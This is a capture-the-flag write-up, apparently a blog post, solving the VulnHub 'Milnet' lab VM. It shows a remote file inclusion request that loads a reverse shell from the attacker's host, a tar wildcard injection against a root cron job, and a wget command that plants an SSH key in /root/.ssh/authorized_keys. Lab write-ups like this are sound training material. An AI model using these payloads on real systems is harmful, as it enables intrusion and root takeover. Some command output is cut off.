It's been a while since I've done one of these. Milnet is the latest VM uploaded to [VulnHub](https://vulnhub.com), and is a beginner level challenge. Not having anything to do at midnight, I decided to give it a shot, if not to kill some time before crashing. You can grab Milnet [here](https://www.vulnhub.com/entry/milnet-1,148/). 

Milnet is kind enough to tell us what IP address it's running on once it boots up. Thank you. In my case, it was 172.16.146.131. As usual, enumeration is key, so I started with a port scan:

```
# echo 172.16.146.131 > ip
# onetwopunch.sh -t ip -i eth1 -n '-sV -A'
                             _                                          _       _

Port 80 looked promising, so I fired up Burp Suite and pointed Iceweasel to http://172.16.146.131. 

![](/images/2016-06-02/milnetweb.png)

After exploring around for a bit, I examined the captured results from Burp Suite and noticed that a POST request was sent when clicking on the buttons on the left:

```
POST /content.php HTTP/1.1
Host: 172.16.146.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4

Referer: http://172.16.146.131/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=bomb
```

It occured to me that the value assigned to route might be a PHP page without the extension. I intercepted the request in Burp Suite, changed it to index, and proved my assumption was correct.

![](/images/2016-06-02/milnetindex.png)

Attempting to include local files like /etc/password didn't work. So I decided to try a remote file include instead. A simple PHP page hosted on my attacking machine that printed out "Hello" sufficed:

```
POST /content.php HTTP/1.1
Host: 172.16.146.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4

Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=http://172.16.146.129/test
```

Sure enough, the contents of my PHP page were executed and displayed:

Time to get a shell! I'm using a PHP reverse shell from [Pentest Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), which you can also find in a default Kali install. I saved it as shell.php, setup a netcat listener on port 1234, and replayed the captured HTTP request on Burp Suite, making sure to set route to http://172.16.146.129/shell

```
POST /content.php HTTP/1.1
Host: 172.16.146.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4

Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

route=http://172.16.146.129/shell
```

Forward the request, and I got my shell:

```
# nc -lvp 445

Ok, next step, escalate privileges. There's only one user on the server:

```
$ ls -l /home/
total 4
drwxr-xr-x 4 langman langman 4096 May 21 22:27 langman

```

Some old school reading right there, except for DefenseCode_Unix_WildCards_Gone_Wild.txt. I remember reading this a while back, and it seemed like it might be a hint on how to progress further. 

Anyway, I did more enumeration and found something interesting in /etc/crontab:

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /backup/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

A script called backup.sh was being executed as root. The contents of said script:

```
$ cat /backup/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /backup/backup.tgz *
```

Oh ho! Looks like that wildcards document was going to come in handy after all. According to the document, we can exploit tar's wildcard parsing by creating a file called "--checkpoint=1" and "--checkpoint-action=exec=sh win.sh". 

```
$ echo '' > '--checkpoint=1'
$ echo '' > '--checkpoint-action=exec=sh win.sh'
$ ls -l
total 128
-rw-rw-rw- 1 www-data www-data     1 Jun  2 19:57 --checkpoint-action=exec=sh win.sh
-rw-rw-rw- 1 www-data www-data     1 Jun  2 19:56 --checkpoint=1
-rw-r--r-- 1 root     root     73450 Aug  6  2015 bomb.jpg
-rw-r--r-- 1 root     root      3901 May 21 18:56 bomb.php
-rw-r--r-- 1 root     root       124 May 21 17:50 content.php
-rw-r--r-- 1 root     root       145 May 21 17:17 index.php
-rw-r--r-- 1 www-data www-data    20 May 21 15:54 info.php
-rw-r--r-- 1 root     root       109 May 21 18:53 main.php
-rw-r--r-- 1 root     root     18260 Jan 22  2012 mj.jpg
-rw-r--r-- 1 root     root       532 May 21 23:33 nav.php
-rw-r--r-- 1 root     root       253 May 22 21:07 props.php
```

Now I just needed something in win.sh. I decided to just have it download my id_rsa_pub into /root/.ssh/authorized_keys so I could ssh in as root. 

```
$ printf 'mkdir -p /root/.ssh && chmod 700 /root/.ssh && wget http://172.16.146.129/id_rsa.pub -O /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys' > win.sh
```

Now I just waited for cron to execute backup.sh, which in turn would execute win.sh. I just watched the HTTP requests until I saw my id_rsa.pub get downloaded:

```

This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!

If you liked it drop me a line on twitter or in #vulnhub.

I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time...

This VM was inspired by The Cuckoo's Egg.
If you have not read it give it a try:

Nice beginner VM, thanks to [@teh_warriar](https://twitter.com/teh_warriar) for providing it!
